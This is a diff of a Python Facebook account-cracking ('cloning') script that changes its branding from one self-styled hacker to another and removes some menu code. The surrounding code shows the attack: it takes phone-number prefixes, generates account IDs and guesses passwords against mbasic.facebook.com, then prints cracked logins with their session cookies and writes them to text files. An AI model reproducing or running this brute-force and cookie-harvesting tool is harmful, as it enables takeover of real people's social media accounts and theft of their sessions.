@@ -228,26 +228,20 @@ for xd in range(10000):
 
 logo =                                          ("""   
 ┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
-┃
-   
- /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$ /$$$$$$$ 
-| $$__  $$ /$$__  $$| $$  /$$/|_  $$_/| $$__  $$
-| $$  \ $$| $$  \ $$| $$ /$$/   | $$  | $$  \ $$
-| $$$$$$$/| $$$$$$$$| $$$$$/    | $$  | $$$$$$$ 
-| $$__  $$| $$__  $$| $$  $$    | $$  | $$__  $$
-| $$  \ $$| $$  | $$| $$\  $$   | $$  | $$  \ $$
-| $$  | $$| $$  | $$| $$ \  $$ /$$$$$$| $$$$$$$/
-|__/  |__/|__/  |__/|__/  \__/|______/|_______/                         
-              
-┃
+██╗░░██╗██████╗░░░███╗░░██████╗░░█████╗░██╗░░░██╗
+██║░░██║██╔══██╗░████║░░██╔══██╗██╔══██╗╚██╗░██╔╝
+███████║██████╔╝██╔██║░░██║░░██║██║░░██║░╚████╔╝░
+██╔══██║██╔══██╗╚═╝██║░░██║░░██║██║░░██║░░╚██╔╝░░
+██║░░██║██║░░██║███████╗██████╔╝╚█████╔╝░░░██║░░░
+╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░░╚════╝░░░░╚═╝░░░
 └━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
   
     ┌━━━━━━━━━━━━━━━━━ RAKIB ━━━━━━━━━━━━━━━━━━┑
-               \033[1;97mCREATED BY   :  RAKIB_H4CKER            
-               \033[1;91mFACEBOK      :  RAKIB KHAN               
-               \033[1;97mGITHUB       :  Rakibkhan48       
-               \033[1;91mSTATUS       :   PAID😴            
-               \033[1;97mTEAM         :  CYBER TECH -539                 
+               \033[1;97mCREATED BY   :  HR1DOY_H4CKER            
+               \033[1;91mFACEBOK      :  HR1DOY ISLAM             
+               \033[1;97mGITHUB       :  HAX4US      
+               \033[1;91mSTATUS       :   ULTRA PAID            
+               \033[1;97mTEAM         :  H4x3R                
                \033[1;91mTOOL VIRSION :  2.09                    
                \033[1;97mTOOL WORK    :  ONLY  DATA           
       └━━━━━━━━━━━━━━━━━ H4CKER ━━━━━━━━━━━━━━━━━┘
@@ -276,24 +270,6 @@ def menu():
 	print ("\033[1;97m[2]\033[1;33m RANDOM CLONEING")
 	print ("\033[1;97m[3]\033[1;33m CRACK FILE")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
-	if ot == '1':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
-		crack_file()
-		
-	if ot == '2':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
-		rndm()
-		
-	if ot == '3':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
-		
-	else:
-		menu()
-
-def menu1():
-	print (f"{warna6}")
-	clear()
-	
 	nam = input("Enter Your Name: ")
 	uid(nam)
 	clear()
@@ -301,28 +277,13 @@ def menu1():
 	print ("\033[1;97m     [2]\033[1;33m BANGLADESH NUMBER")
 	print ("\033[1;97m     [3]\033[1;33m MY YOUTUBE CHANEL")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
-	if ot == '1':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
-		crack_file()
-	if ot == '2':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
-		rndm()
-	if ot == '3':
-		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
-
-	else:
-		menu()
-
-def rndm():
-	user=[]
-	print (f"{warna1}")
 	clear()
 	print(gyc)
 	print ("""+------------------------------+
-|        Example>:             |
-|        0191,0172,0183,       |
-|        92302,92301,91778     |
-+------------------------------+
+                  |        Example>:             |
+                  |        0191,0172,0183,       |
+                  |        92302,92301,91778     |
+                  +------------------------------+
 """)
 	cod = input('\n INPUT YOUR SIM CODE: ')
 	if len(cod) != 4:
@@ -379,7 +340,7 @@ def c(uid,pwx,ln):
         for ps in pwx:
             session = requests.Session()
             wa = random.choice(my_color)
-            sys.stdout.write(f'\r%s[RAKIB_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
+            sys.stdout.write(f'\r%s[HR1DOY_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://mbasic.facebook.com').text
@@ -418,10 +379,10 @@ def c(uid,pwx,ln):
             #	botok(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[65:80]
-            	print('\033[1;92mRAKIB-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
+            	print('\033[1;92mHR1DOY-OK[💀]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
             	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('RAKIB-OK.txt', 'a').write( cid+' | '+ps+'\n')
-            	open('RAKIB-coki.txt', 'a').write(coki+'\n')
+            	open('HR1DOY-OK.txt', 'a').write( cid+' | '+ps+'\n')
+            	open('HR1DOY-coki.txt', 'a').write(coki+'\n')
             	cek_apk(session,coki)
             	oks.append(cid)
             	break
@@ -429,9 +390,9 @@ def c(uid,pwx,ln):
             	#botcp(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[82:97]
-            	print('\33[1;30m(RAKIB-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
+            	print('\33[1;30m(HR1DOY-Cp [❗️] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
             	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('RAKIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
+            	open('HR1DOY-CP.txt', 'a').write( uid+' | '+ps+' \n')
             	cps.append(cid)
             	break
             else:
@@ -527,9 +488,9 @@ def passwrd():
     
 	
 	
-nam = "RAKIB"
-name = "[RAKIB-OK]"
-name1 = "[RAKIB-CP]"
+nam = "HR1DOY"
+name = "[HR1DOY-OK]"
+name1 = "[HR1DOY-CP]"
 	
 def crack(idf,pwv):
 	global loop,ok,cp
